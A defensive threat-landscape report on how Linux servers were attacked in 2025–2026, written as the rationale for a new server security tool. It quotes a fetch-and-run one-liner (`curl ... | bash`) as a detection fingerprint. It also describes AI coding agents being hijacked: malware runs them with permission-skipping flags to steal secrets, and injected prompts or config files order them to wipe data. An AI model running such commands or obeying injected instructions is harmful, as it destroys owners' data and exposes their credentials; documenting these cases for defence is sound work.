# Leaked keys and zero-day windows reshape Linux defense

Attackers now get into Linux servers mostly through three doors: unpatched internet-facing software (the top vector in **32%** of intrusions investigated by Mandiant in 2025, for the sixth year running), unauthenticated services left open on the network (Docker API, Redis, Kubernetes, and now Ollama, Ray and other AI tooling), and plain SSH password guessing ([Mandiant M-Trends 2026](https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2026)). What has changed since 2024 is what happens next and how fast. The goal has shifted from planting a coin miner to stealing credentials, and AI API keys are now a first-class target: the PCPJack worm of May 2026 deploys no miner at all and instead harvests SSH keys, cloud tokens and OpenAI/Anthropic keys from exposed Docker and Kubernetes hosts ([Cyber Security News, citing SentinelOne](https://cybersecuritynews.com/new-pcpjack-worm-targets-docker/)). AI has also made developers leak more (about **1.28 million** AI-service secrets hit public GitHub in 2025, up **81%**), shipped a new class of exposed, unauthenticated AI services (over **230,000** Ray servers, tens of thousands of Ollama and OpenClaw instances), and turned AI coding agents with shell access into something malware actively hijacks ([The Hacker News](https://thehackernews.com/2026/03/the-state-of-secrets-sprawl-2026-9.html); [The Hacker News](https://thehackernews.com/2025/11/shadowray-20-exploits-unpatched-ray.html); [Wiz](https://wiz.io/blog/s1ngularity-supply-chain-attack)). Meanwhile AI bug-finding systems are producing kernel root bugs faster than maintainers can patch them, and mean time-to-exploit is now **negative seven days**, meaning exploitation typically begins before a patch exists ([Mandiant M-Trends 2026](https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2026)). The existing open-source toolbox (fail2ban, CrowdSec, Falco, auditd, Lynis, AIDE, Wazuh, gitleaks, trufflehog) covers the classic threats well but leaves the AI-era ones almost entirely uncovered at the host level, and the one tool that tries to do everything (Wazuh) is too heavy for small fleets. A new Linux server security manager should therefore be a lightweight single binary that orchestrates the classic tools where they are good, and itself builds the missing pieces: an exposure scanner that knows about AI services, a secrets-on-host scanner tuned for AI key formats, a KEV-driven patch timer with a three-day SLA, a persistence watchlist that catches rootkits by cross-checking rather than by signature, and an AI-agent guard that watches what coding agents are actually running.

## Exposed services, web apps and SSH remain the front door, but the loot is now credentials

The intrusion statistics for 2025 look familiar on the surface. Mandiant's 2026 report puts exploits at **32%** of initial access, voice phishing at 11%, prior compromise at 10% and stolen credentials at 9%, with a global median dwell time of **14 days** ([Mandiant M-Trends 2026](https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2026)). VulnCheck adds that network edge devices were the most-targeted technology class among known-exploited vulnerabilities in 2025, and that in the first half of 2026 content-management systems, especially WordPress plugins, made up **one-third** of all new KEV entries ([VulnCheck 1H-2026](https://www.vulncheck.com/blog/state-of-exploitation-1h-2026)). For Linux servers specifically, the mass-scale picture is driven by opportunistic scanning. AhnLab's honeypots for poorly managed SSH servers in Q4 2025 saw the **P2PInfect worm in 80.4%** of attacks, Prometei in 8.3% and raw XMRig in 2.4%, with the rest mostly DDoS bots ([AhnLab ASEC](https://asec.ahnlab.com/en/92004/)). The Outlaw botnet, analyzed by Elastic in 2025, is the archetype: it gets in by brute-forcing SSH against weak or default passwords, then brute-forces the local subnet to spread, persists through cron jobs and modified `~/.ssh/authorized_keys`, and drops a modified XMRig miner with IRC command-and-control ([Elastic Security Labs](https://www.elastic.co/security-labs/outlaw-linux-malware)).

The second door is any service that listens without authentication. The Docker API on **TCP 2375** has been abused since at least early 2024: attackers create an Alpine container that bind-mounts the host's root filesystem and chroot into it, a pattern seen in Commando Cat, the Dero miner worm and others ([Trend Micro](https://www.trendmicro.com/en_us/research/24/f/commando-cat-a-novel-cryptojacking-attack-.html); [Kaspersky Securelist](https://securelist.com/dero-miner-infects-containers-through-docker-api/116546/)). In 2026 this evolved into PCPJack, which scans cloud IP ranges for exposed Docker, Kubernetes, Redis, MongoDB and Ray, moves laterally over SSH, and chains in web vulnerabilities including the Next.js middleware bypass (CVE-2025-29927), React2Shell (CVE-2025-55182), a WPVivid Backup upload bug and a CentOS Web Panel shell injection. Its distinguishing feature is that it deploys no miner. It steals SSH keys, Slack tokens, WordPress database credentials, OpenAI and Anthropic API keys, cloud tokens, environment variables, crypto wallets and Vault/1Password/Grafana credentials, encrypts them, exfiltrates them to Telegram, and then drops a Sliver implant disguised as `/var/tmp/apt-daily-upgrade` ([Cyber Security News](https://cybersecuritynews.com/new-pcpjack-worm-targets-docker/)). This matters for a tool builder because it shows that credential theft is now the primary objective of commodity worms, not a side effect of mining.

The third door is the web application stack itself. React2Shell (CVE-2025-55182), a deserialization bug in React Server Components and Next.js, was disclosed on **2025-12-03** and exploited by **2025-12-05**, with Darktrace observing opportunists hitting it within hours ([Microsoft Security](https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/); [Darktrace](https://www.darktrace.com/blog/react2shell-how-opportunist-attackers-exploited-cve-2025-55182-within-hours)). Linux payloads included XMRig, a backdoor masquerading as the kernel's `kswapd`, the Kaiji botnet, Sliver and Cobalt Strike, and at least five China-linked groups weaponized it ([The Hacker News](https://thehackernews.com/2025/12/react2shell-vulnerability-actively.html)). The observable fingerprints are consistent across campaigns: a `node` (or PHP or Java) parent spawning `sh`, `bash`, `curl` or `wget`; one-liners such as `curl -sfL http://IP/b.sh | bash`; executables created in memory via `memfd_create`; new systemd units, cron entries or `rc.local` edits with plausible-sounding names; and miners named `crond` or `systemd-devd` running from `/tmp` or `/dev/shm` ([Sophos](https://www.sophos.com/en-us/blog/react2shell-flaw-cve-2025-55182-exploited-for-remote-code-execution); [Qualys](https://blog.qualys.com/product-tech/2025/12/10/react2shell-decoding-cve-2025-55182-the-silent-threat-in-react-server-components/)). A similar path ran through SAP NetWeaver (CVE-2025-31324), exploited as a zero-day for about five weeks before disclosure and used to drop the Auto-Color Linux RAT, which persists through `/etc/ld.so.preload` and stays dormant when its C2 is unreachable, defeating sandboxes ([BleepingComputer](https://bleepingcomputer.com/news/security/hackers-exploit-sap-netweaver-bug-to-deploy-linux-auto-color-malware); [Darktrace](https://www.darktrace.com/blog/auto-color-backdoor-how-darktrace-thwarted-a-stealthy-linux-intrusion)).

Supply chain is the fourth, less frequent but higher-impact door. The xz-utils backdoor of March 2024 (CVE-2024-3094) inserted a pre-authentication hook into sshd via liblzma and was caught just before it reached stable distributions ([oss-security](https://www.openwall.com/lists/oss-security/2024/03/29/4)). In June 2026 the "Atomic Arch" attack took over abandoned Arch User Repository packages and modified their build scripts to drop a Rust credential stealer and an optional eBPF rootkit, persisting through systemd units with `Restart=always`; reported package counts range from roughly 408 to over 1,500 ([CSA research note](https://labs.cloudsecurityalliance.org/research/csa-research-note-aur-supply-chain-ebpf-rootkit-20260614-csa/)). Older remote daemon bugs still shape the baseline too: regreSSHion (CVE-2024-6387) gave unauthenticated remote root in OpenSSH but required thousands of attempts, leaving a detectable flood of `Timeout before authentication` lines, and the CUPS chain of September 2024 turned UDP 631 into a remote code execution path ([Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2024/07/01/regresshion-remote-unauthenticated-code-execution-vulnerability-in-openssh-server); [evilsocket](https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/)).

### After the break-in: persistence hides deeper, and root is one script away

Once inside, commodity and advanced actors use the same persistence playbook: cron, systemd services and timers, `authorized_keys` and `rc.local` ([Elastic Security Labs](https://www.elastic.co/security-labs/outlaw-linux-malware); [Sophos](https://www.sophos.com/en-us/blog/react2shell-flaw-cve-2025-55182-exploited-for-remote-code-execution)). The stealthier tier has moved into places that file scanners rarely look. The "Plague" PAM backdoor, disclosed by Nextron in August 2025, is a rogue PAM module (named to look like `libselinux.so.8`) that hooks `pam_sm_authenticate()`, allows login with a hardcoded password over SSH or sudo, survives updates, unsets `SSH_CONNECTION` and redirects `HISTFILE` to `/dev/null`; it had been active for a year and had **zero antivirus detections** on VirusTotal at disclosure ([Nextron Systems](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)). eBPF rootkits are the 2026 trend: Elastic documented the VoidLink framework (LKM plus eBPF, 30+ plugins, Docker/Kubernetes aware) in January, Field Effect reported the ShadowGuard eBPF rootkit used in espionage against government and critical infrastructure in 37 countries in February, and the Atomic Arch rootkit hooks `getdents64()` to hide files and processes from `ls`, `ps` and `find` ([Elastic Security Labs](https://www.elastic.co/security-labs/illuminating-voidlink); [Field Effect](https://fieldeffect.com/blog/global-espionage-operation-ebpf-rootkit-linux-systems); [CSA](https://labs.cloudsecurityalliance.org/research/csa-research-note-aur-supply-chain-ebpf-rootkit-20260614-csa/)). Elastic's recommended control is to watch `bpf(BPF_PROG_LOAD)` events and flag suspicious helpers at load time, because these rootkits evade both kernel-module monitoring and syscall-table checks ([LinuxSecurity advisory watch](https://linuxsecurity.com/newsletters/linux-advisory-watch/linux-advisory-watch-july-3-2026)).

Privilege escalation has become cheap because reliable public local root exploits keep landing in CISA's catalog. The sudo chroot bug (CVE-2025-32463, CVSS 9.3) lets any user load a malicious NSS library as root via `sudo -R`; public exploits appeared in July 2025 and CISA added it to KEV in September ([The Hacker News](https://thehackernews.com/2025/09/cisa-sounds-alarm-on-critical-sudo-flaw.html)). The bigger one is "Copy Fail" (CVE-2026-31431), found by Theori's AI analysis tool and disclosed at the end of April 2026. An unprivileged user opens an `AF_ALG` crypto socket, calls `splice()`, and gets a controlled four-byte write into the **page cache** of any readable file, including a setuid-root binary. The on-disk file never changes, so hash-based file-integrity monitoring sees nothing; the bug works across container boundaries because the page cache is shared; the public proof of concept is a **732-byte Python script** that is "100% reliable" on Ubuntu 24.04, Amazon Linux 2023, RHEL 10.1 and SUSE 16; and CISA added it to KEV on **2026-05-01**, about two days after disclosure ([BleepingComputer](https://bleepingcomputer.com/news/security/new-linux-copy-fail-flaw-gives-hackers-root-on-major-distros); [CISA](https://www.cisa.gov/news-events/alerts/2026/05/01/cisa-adds-one-known-exploited-vulnerability-catalog); [Help Net Security](https://www.helpnetsecurity.com/2026/04/30/copyfail-linux-lpe-vulnerability-cve-2026-31431/)). Three more kernel bugs followed into KEV in August and September 2026 (an IPv6 LPE, an ebtables out-of-bounds write and an AF_ALG race), the latter two under CISA's BOD 26-04 with a **three-day** remediation deadline for internet-exposed assets ([CISA](https://www.cisa.gov/news-events/alerts/2026/09/18/cisa-adds-two-known-exploited-vulnerabilities-catalog); [Qualys](https://blog.qualys.com/product-tech/2026/09/23/cisa-bod-26-04-timelines-for-three-linux-kernel-cves)). The practical conclusion is that on an unpatched kernel, any foothold (a web shell, a container, a low-privilege SSH account) should be treated as root.

Monetization is split three ways. Mining persists but is throttled and disguised, with pool connections on ports like 3333, 4444 and 14444 and competitor-killing scripts ([Qualys](https://blog.qualys.com/product-tech/2025/12/10/react2shell-decoding-cve-2025-55182-the-silent-threat-in-react-server-components/)). Credential theft is rising: Mandiant highlights theft of long-lived OAuth tokens, session cookies, hard-coded keys and personal access tokens, and the QUIETVAULT stealer explicitly checks hosts for local AI CLI tools ([Mandiant M-Trends 2026](https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2026)). Ransomware against Linux now targets the hypervisor layer: Mandiant describes attacks on vSphere datastores by groups such as Akira and Qilin, and earlier cases show a Python ESXi encryptor going from breach to encryption in under three hours ([Mandiant M-Trends 2026](https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2026); [CSA](https://cloudsecurityalliance.org/articles/esxi-ransomware-the-growing-threat-to-virtualized-environments)). One statistic that should not be reused: the widely repeated claims that "89% of Linux attacks are brute force" and "79% are malware-free" could not be traced to any primary report, so treat them as folklore.

## The AI era adds four new attack surfaces to every developer's server

The first is leaked AI credentials. GitGuardian's 2026 report counted about **29 million** new secrets on public GitHub in 2025, a **34%** jump; **1,275,105** of them belonged to AI services, up **81%** year over year, and eight of the ten fastest-growing secret categories were AI-related ([GitGuardian](https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026-pr); [The Hacker News](https://thehackernews.com/2026/03/the-state-of-secrets-sprawl-2026-9.html)). The same report claims commits co-authored by Claude Code leaked secrets at roughly **3.2%** against a 1.5% baseline, a figure that comes from GitGuardian's own attribution method and has not been independently checked ([GitGuardian](https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026-pr)). The leak is not limited to git. Flare found **10,456** Docker Hub images leaking secrets, with LLM API keys the single largest category at about **4,000** keys (OpenAI, Hugging Face, Anthropic, Gemini, Groq), mostly from `.env` files, config directories, hardcoded keys in Python or Node code and Dockerfiles; roughly three-quarters of developers who removed a leaked secret never rotated it ([Flare](https://flare.io/learn/resources/docker-hub-secrets-exposed); [eSecurity Planet](https://www.esecurityplanet.com/threats/flare-finds-10000-docker-hub-images-exposing-sensitive-secrets/)). Wiz found verified leaked secrets at **65%** of the Forbes AI 50, often in deleted forks, gists and workflow logs rather than at HEAD ([Wiz](https://wiz.io/blog/forbes-ai-50-leaking-secrets)). Stolen keys are monetized through "LLMjacking": Sysdig estimated an undetected victim could pay over **$46,000 per day**, later cases exceeded **$100,000 per day** with Claude 3 Opus, and attackers had DeepSeek-R1 access the day after its release, reselling through reverse proxies ([The Hacker News](https://thehackernews.com/2024/05/researchers-uncover-llmjacking-scheme.html); [Sysdig](https://sysdig.com/?p=101302)). Sysdig also reported a **376%** rise in AI-service credential theft between Q4 2025 and Q1 2026 ([CSA LLMjacking note](https://labs.cloudsecurityalliance.org/research/csa-research-note-llmjacking-evolved-offensive-agentic-20260/)). For a server tool, the implication is that `.env` files, shell history, `~/.aws`, agent config directories and running-process environments on the box itself are as important to scan as the repository.

The second surface is exposed AI infrastructure, which mostly ships without authentication and is easy to bind to every interface. Ray's dashboard Jobs API (CVE-2023-48022) is unauthenticated "by design" and unpatched; the ShadowRay 2.0 campaign of November 2025 turned it into a self-propagating botnet that mines XMRig throttled to under 60% CPU, with over **230,000** Ray servers internet-exposed, up from a few thousand in 2024 ([The Hacker News](https://thehackernews.com/2025/11/shadowray-20-exploits-unpatched-ray.html); [The Register](https://www.theregister.com/2025/11/18/selfreplicating_botnet_ray_clusters/)). Ollama has no built-in authentication; Cisco Talos counted over **1,100** exposed instances in September 2025, a Shodan query in April 2026 returned more than **25,000**, and the "Bleeding Llama" bug (CVE-2026-7482, CVSS 9.1) lets an unauthenticated caller read memory, including keys and environment variables, from anything before 0.17.1 ([Cisco](https://blogs.cisco.com/security/detecting-exposed-llm-servers-shodan-case-study-on-ollama); [InsecureStack](https://insecurestack.substack.com/p/eus-exposed-ai-infrastructure); [Indusface](https://www.indusface.com/blog/cve-2026-7482-bleeding-llama-vulnerability/)). The root cause is usually a Docker `-p 11434:11434` publish that binds to all interfaces and, because rootful Docker writes its own iptables rules, silently bypasses UFW ([GreenGeeks](https://www.greengeeks.com/blog/ai-self-hosted-model-risks/)). Langflow (CVE-2025-3248, CVSS 9.8) went into CISA KEV in May 2025 after the Flodrix botnet started using it ([Trend Micro](https://www.trendmicro.com/en_us/research/25/f/langflow-vulnerability-flodric-botnet.html)). The OpenClaw agent gateway defaults to `0.0.0.0:18789`, had a one-click token-stealing RCE (CVE-2026-25253), and showed **42,665** exposed instances on Shodan in February 2026, roughly 15,000 of them vulnerable ([Techzine](https://www.techzine.eu/news/security/138633/over-40000-openclaw-agents-vulnerable/); [ClawDocs](https://clawdocs.org/security/known-vulnerabilities)). MCP servers follow the same pattern: Knostic found **1,862** internet-exposed MCP servers and all 119 it checked by hand returned their tool list without authentication; Backslash found hundreds bound to 0.0.0.0 with some vulnerable to OS command injection; the MCP Inspector (CVE-2025-49596) and mcp-remote (CVE-2025-6514) both had critical RCEs ([Knostic](https://knostic.ai/blog/mapping-mcp-servers-study); [Backslash](https://www.backslash.security/blog/hundreds-of-mcp-servers-vulnerable-to-abuse); [The Hacker News](https://thehackernews.com/2025/07/critical-mcp-remote-vulnerability.html)). A CSA note from May 2026 adds that **31%** of 5,200+ Ollama servers answered unauthenticated prompts, over **12,000** Open WebUI instances were exposed, and GreyNoise logged **91,403** attack sessions against LLM endpoints in a four-month window ([CSA](https://labs.cloudsecurityalliance.org/research/csa-research-note-exposed-ai-infrastructure-selfhosted-secur/)). Attackers also use these boxes as compute: Sysdig observed a misconfigured Ollama server being used as the reasoning engine for someone else's attack pipeline ([CSA LLMjacking note](https://labs.cloudsecurityalliance.org/research/csa-research-note-llmjacking-evolved-offensive-agentic-20260/)).

The third surface is AI coding agents that hold shell access and credentials. The s1ngularity attack on the Nx build system in August 2025 is the clearest case: malicious npm versions ran the victim's own Claude, Gemini and Amazon Q CLIs with `--dangerously-skip-permissions`, `--yolo` and `--trust-all-tools` to search the filesystem for secrets and wallets, then pushed the results to public GitHub repositories; around **2,349** secrets leaked, and Wiz found **90%** of more than 1,000 leaked GitHub tokens still valid ([Wiz](https://wiz.io/blog/s1ngularity-supply-chain-attack); [Apiiro](https://apiiro.com/blog/nx-supply-chain-breach-shows-why-malicious-package-detection-matters)). Shai-Hulud 2.0 in November 2025 hit an estimated 600 to 1,000+ npm packages (Zapier, Postman, PostHog among them), installs the Bun runtime from a `preinstall` hook, harvests npm, GitHub, Actions runner and AWS/GCP/Azure credentials, republishes the victim's other packages to spread, and tries to wipe the home directory if it cannot exfiltrate ([Cycode](https://cycode.com/blog/shai-hulud-2-0-deep-dive-and-actionable-steps-you-should-take/); [Invicti](https://www.invicti.com/blog/web-security/shai-hulud-2-worm-supply-chain-attack-on-npm-dependencies)). In June 2026, OSV catalogued a cluster of "0x2ai-*" npm packages whose postinstall scripts write a `.mcp.json` pointing Claude Code at an attacker-controlled MCP server, plant `CLAUDE.md` and `.claude/` settings that survive `npm uninstall`, and in some cases launch `claude --dangerously-skip-permissions` directly, relaying prompts, memory and provider keys through the attacker's endpoint ([OSV MAL-2026-5592](https://osv.dev/vulnerability/MAL-2026-5592); [OSV MAL-2026-5591](https://osv.dev/vulnerability/MAL-2026-5591)). Even vendor-shipped tooling has carried a payload: Amazon Q's VS Code extension v1.84.0 contained an injected prompt instructing the agent to wipe the home directory and delete EC2 instances, S3 buckets and IAM users, which failed only because of a formatting error ([AWS bulletin](https://aws.amazon.com/it/security/security-bulletins/AWS-2025-015/); [Tenable](https://www.tenable.com/cve/CVE-2025-8217)). Prompt-injection RCEs in Cursor (CurXecute, MCPoison) and Gemini CLI showed that a Slack message or a `GEMINI.md` file can rewrite agent config and run commands ([The Hacker News](https://thehackernews.com/2025/08/cursor-ai-code-editor-fixed-flaw.html); [Tenable](https://www.tenable.com/cve/CVE-2025-54136)).

The fourth surface is the package ecosystem itself, through "slopsquatting" and AI-assisted attackers. The USENIX Security 2025 study found that **19.7%** of packages recommended by LLMs did not exist, producing 205,474 unique fake names, and that **43%** of those hallucinations repeated across all ten reruns of a prompt, which is exactly the property an attacker needs to pre-register them; a researcher who registered the hallucinated `huggingface-cli` on PyPI as an empty package saw more than **30,000** downloads in three months ([CSA](https://labs.cloudsecurityalliance.org/research/csa-research-note-slopsquatting-ai-supply-chain-20260419/)). No in-the-wild slopsquatting compromise with a malicious payload has been documented yet, so this is a real but still-theoretical risk. AI-assisted attacks are no longer theoretical. Anthropic's GTG-1002 report describes a Chinese state-sponsored campaign in which Claude Code, driven through MCP tooling, performed **80 to 90%** of tactical work across roughly 30 targets with humans intervening at only four to six decision points ([Anthropic](https://assets.anthropic.com/m/ec212e6566a0d47/original/Disrupting-the-first-reported-AI-orchestrated-cyber-espionage-campaign.pdf)). Google's threat intelligence group documented PROMPTSTEAL, APT28 malware that calls a Hugging Face-hosted model at runtime to generate commands, and PROMPTLOCK, a proof-of-concept ransomware that uses an LLM to write Lua scripts for reconnaissance and encryption on Windows and Linux ([Google GTIG](https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools); [The Hacker News](https://thehackernews.com/2025/11/google-uncovers-promptflux-malware-that.html)). The ShadowRay 2.0 operator used LLM-generated payloads ([The Hacker News](https://thehackernews.com/2025/11/shadowray-20-exploits-unpatched-ray.html)). The detection angle here is useful: LLM-enabled malware needs outbound access to LLM APIs, so a shell, Python process or unknown binary talking to `api.openai.com`, `api.anthropic.com`, `generativelanguage.googleapis.com` or Hugging Face endpoints from a server that should not be using AI is a strong signal. And because AI-driven intrusions run at "physically impossible request rates," rate-based detection of reconnaissance bursts regains value.

## AI finds root bugs faster than anyone patches them, and exploits land in hours

AI bug-finding went industrial between late 2024 and 2026. Google's OSS-Fuzz reported **26** vulnerabilities from AI-generated fuzz targets in November 2024, including a 20-year-old OpenSSL bug, and expanded coverage to 272 C/C++ projects ([Google Security Blog](https://security.googleblog.com/2024/11/leveling-up-fuzzing-finding-more.html)). Sean Heelan used OpenAI's o3 to find a use-after-free in the Linux kernel's in-kernel SMB server, ksmbd (CVE-2025-37899), by feeding it about 12,000 lines of handler code ([Linuxiac](https://linuxiac.com/chatgpt-o3-model-found-remote-zeroday-in-linux-kernel-code/)). Google's Big Sleep found a SQLite bug (CVE-2025-6965) that Google says was already known to threat actors, cutting off exploitation before it started ([The Hacker News](https://thehackernews.com/2025/07/google-ai-big-sleep-stops-exploitation.html)). Anthropic reported that Claude Opus 4.6 found over **500** high-severity bugs in open-source libraries including Ghostscript and OpenSC ([The Hacker News](https://thehackernews.com/2026/02/claude-opus-46-finds-500-high-severity.html)), and OpenAI's Codex Security (formerly Aardvark) has about 14 CVEs across OpenSSH, GnuTLS, GnuPG, libssh and PHP ([the-decoder](https://the-decoder.com/openai-launches-codex-security-an-ai-agent-designed-to-detect-vulnerabilities-in-software-projects/)). The step change came with Anthropic's Claude Mythos Preview in April 2026: a 27-year-old OpenBSD TCP bug, a 16-year-old FFmpeg heap overflow, a 17-year-old FreeBSD NFS stack overflow that the model exploited to unauthenticated remote root "fully autonomously in several hours," and in the Linux kernel "nearly a dozen" local privilege escalation chains built from two to four individually non-exploitable bugs ([Anthropic](https://www.anthropic.com/research/mythos-preview)). More than **99%** of the findings were unpatched at announcement.

The bottleneck has moved from discovery to patching. VulnCheck's independent count in July 2026 shows Project Glasswing with **23,019** claimed findings, **1,611** committed ledger entries, **126** published CVEs and one confirmed exploited, with more than 150 findings past their disclosure deadline ([VulnCheck 1H-2026](https://www.vulncheck.com/blog/state-of-exploitation-1h-2026)). At the same time, low-quality AI-generated reports are drowning maintainers of exactly the packages Linux servers run on: curl ended its bug bounty in January 2026 after receiving seven reports in 16 hours, none of them real ([The Register](https://www.theregister.com/2026/01/21/curl_ends_bug_bounty/)). DARPA's AIxCC finalists found 54 of 70 planted bugs plus 18 real zero-days at about **$152** per task and about 45 minutes per patch, which also makes the defensive case for running AI scanners against your own code ([DARPA](https://www.darpa.mil/news/2025/aixcc-results)).

The Linux-specific pattern among AI-found bugs is consistent: local privilege escalation through kernel subsystems any unprivileged user can reach. Copy Fail went through AF_ALG crypto sockets; CVE-2026-53264, a net/sched use-after-free found with AI assistance by a STAR Labs researcher and independently by an AI system two days before a hacking contest, requires unprivileged user namespaces; GhostLock (CVE-2026-43499), found by an AI agent, had sat in the kernel since 2011 ([Infosecurity](https://www.infosecurity-magazine.com/news/ai-linux-kernel-zero-day-net-sched/); [gHacks](https://www.ghacks.net/2026/07/13/ai-agent-discovers-15-year-old-linux-kernel-privilege-escalation-bug-named-ghostlock/)). Because the attack surface is the common factor, blacklisting unused modules (`algif_aead`, `ksmbd`) and disabling unprivileged user namespaces where they are not needed are mitigations that do not depend on patch timing ([Rewterz](https://rewterz.com/threat-advisory/ai-discovers-linux-kernel-zero-day-enabling-root-escalation); [Qualys](https://threatprotect.qualys.com/2026/05/04/linux-kernel-vulnerability-exploited-in-the-wild-copy-fail-cve-2026-31431/)).

On speed, two signals coexist and a tool builder needs both. Capability evidence says the window has collapsed for bugs attackers choose: Mythos produced working privilege-escalation exploits for more than half of 40 selected Linux kernel n-day CVEs, with examples costing under $1,000 and half a day; CSA cites AI generating working exploits from CVE descriptions in **10 to 15 minutes at about $1 per attempt**; a 2024 UIUC study had GPT-4 exploiting **87%** of 15 one-day bugs from their descriptions ([Anthropic](https://www.anthropic.com/research/mythos-preview); [CSA Labs](https://labs.cloudsecurityalliance.org/research/ai-accelerated-exploitation-systemic-risk-v1/); [Campus Technology](https://campustechnology.com/Articles/2024/07/01/UIUC-Study-AI-Agents-Can-Exploit-Cybersecurity-Vulnerabilities.aspx)). Industry metrics agree: Mandiant's mean time-to-exploit is **−7 days**, CrowdStrike reports 42% of vulnerabilities exploited before disclosure with eCrime breakout averaging 29 minutes, Rapid7's median CVE-to-KEV fell to 5 days, and the 2026 Verizon DBIR says AI is compressing attacker timelines "from months to hours" while defenders' median full-patch time grew to **43 days** ([CSA Labs](https://labs.cloudsecurityalliance.org/research/ai-accelerated-exploitation-systemic-risk-v1/)). Aggregate data, though, says attackers still exploit selectively: VulnCheck found **28.96%** of 2025 KEVs exploited on or before the CVE's publication day, dipping to **23.43%** in the first half of 2026; the median time from CVE to KEV dropped from 120 to 80 days; CVE volume grew **45%** half-over-half while KEVs grew only 10%; and only **1.3%** of 1,061 AI-attributed vulnerabilities were confirmed exploited, roughly the base rate ([VulnCheck 1H-2026](https://www.vulncheck.com/blog/state-of-exploitation-1h-2026); [VulnCheck 2026](https://www.vulncheck.com/blog/state-of-exploitation-2026)). The year 2025 produced a record **48,185** CVEs, and NIST dropped universal enrichment in April 2026 with about 29,000 CVEs backlogged, so a tool cannot lean on NVD CVSS for triage ([Jerry Gamblin](https://jerrygamblin.com/2026/01/01/2025-cve-data-review/); [CSA Labs](https://labs.cloudsecurityalliance.org/research/ai-accelerated-exploitation-systemic-risk-v1/)). The practical rule that emerges is to prioritize by KEV and EPSS plus exposure, treat every KEV hit on your fleet as an active incident, and use the BOD 26-04 three-day deadline as the default SLA for anything internet-facing. Copy Fail's timeline also shows that the upstream fix (April 1) landed about four weeks before public disclosure (April 29), so watching stable-kernel releases and distro advisories catches fixes before the CVE does.

## Existing tools cover the classics but leave the AI-era gaps open

The open-source toolbox is alive but fragmented, and each tool owns one slice. fail2ban is a regex-over-logs engine that bans IPs with iptables, uses 5 to 50 MB of RAM, has no outbound network dependency, and has been in use since 2004; its limits are that it is reactive, local-only, needs regex skill for custom services and has no shared threat intelligence ([Canadian Web Hosting](https://blog.canadianwebhosting.com/fail2ban-vs-crowdsec-2026/)). CrowdSec replaces the regex with YAML scenarios, adds a crowd-sourced blocklist and separate "bouncers" that enforce at the firewall or web server, costs 50 to 150 MB, is MIT-licensed and needs HTTPS to its central API for full function ([Canadian Web Hosting](https://blog.canadianwebhosting.com/fail2ban-vs-crowdsec-2026/); [lumadock](https://lumadock.com/tutorials/crowdsec-vs-fail2ban)). Falco is a CNCF-graduated eBPF syscall sensor with the largest rule library; Tetragon can block in-kernel but needs a 5.3+ kernel with BTF and more policy writing; Tracee gives the deepest forensic detail at higher cost; all three are documented and benchmarked as Kubernetes tools, though they run on bare hosts too ([devopsboys](https://devopsboys.com/blog/falco-vs-tetragon-runtime-security-comparison-2026); [SciTePress 2025](https://scitepress.org/publishedPapers/2025/142727/pdf/index.html)). auditd is the kernel's native audit trail but its raw logs are hard to use and its dispatcher can block on I/O; Laurel (an auditd plugin emitting enriched JSON with parent-process context) and go-audit (a netlink-direct replacement) exist to fix that ([docs.rs laurel](https://docs.rs/crate/laurel/0.6.1); [starlog](https://starlog.is/articles/developer-tools/slackhq-go-audit)). Lynis audits hardening and compliance, not rootkits; AIDE does hash-based file integrity; OpenSCAP does CIS-style benchmarks ([Wikipedia](https://en.wikipedia.org/wiki/Lynis); [Debian tracker](https://tracker.debian.org/pkg/src:aide)). Trivy and Grype find known CVEs in packages and images; gitleaks and TruffleHog find secrets in repositories and, when pointed at a path, on disk ([tech-insider](https://tech-insider.org/trivy-tutorial-2026/); [Arch](https://www.archlinux.org/packages/extra/x86_64/gitleaks)).

Two things about this toolbox should shape the design. First, the all-in-one option is too heavy for the target user. Wazuh's own community treats about 5 GB of RAM as normal, its vulnerability detector and inventory modules are single-threaded and spike CPU, it drops events at a few hundred per second, a small single node becomes fragile under disk pressure, one reviewer reported over 3 TB of storage for a small client, and version 5.0 requires a fresh deployment ([Wazuh group](https://groups.google.com/g/wazuh/c/xoJ14o7dnI0); [Wazuh group](https://groups.google.com/g/wazuh/c/afBxk9gpHZI); [AWS Marketplace](https://aws.amazon.com/marketplace/reviews/reviews-list/prodview-eju4flv5eqmgq); [Wazuh mailing list](https://groups.google.com/g/wazuh/c/aD4iCWMN4Yc)). Second, the legacy rootkit scanners are effectively dead: rkhunter had no official release for about seven years as of 2025 and chkrootkit's last confirmed release is 0.55 from June 2021, with a long history of false positives ([Wikipedia](https://en.wikipedia.org/wiki/Rkhunter); [linux-server-admin wiki](https://wiki.linux-server-admin.com/software/security/audit/chkrootkit/history)). Neither would see Plague, an eBPF rootkit or Copy Fail. Third, security tools are themselves a privileged attack surface: needrestart, installed by default on Ubuntu Server, had five root-escalation bugs disclosed in November 2024; Trivy's release pipeline was compromised in March 2026 with backdoored binaries pushed to GitHub Releases, Docker Hub and ECR; and TruffleHog was the engine Shai-Hulud used to loot its victims ([Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2024/11/19/qualys-tru-uncovers-five-local-privilege-escalation-vulnerabilities-in-needrestart); [Wiz](https://wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack); [Infosecurity](https://www.infosecurity-magazine.com/news/supply-chain-worm-hundreds-npm/)). A new manager must pin and verify what it installs and avoid running root-level parsers on untrusted input.

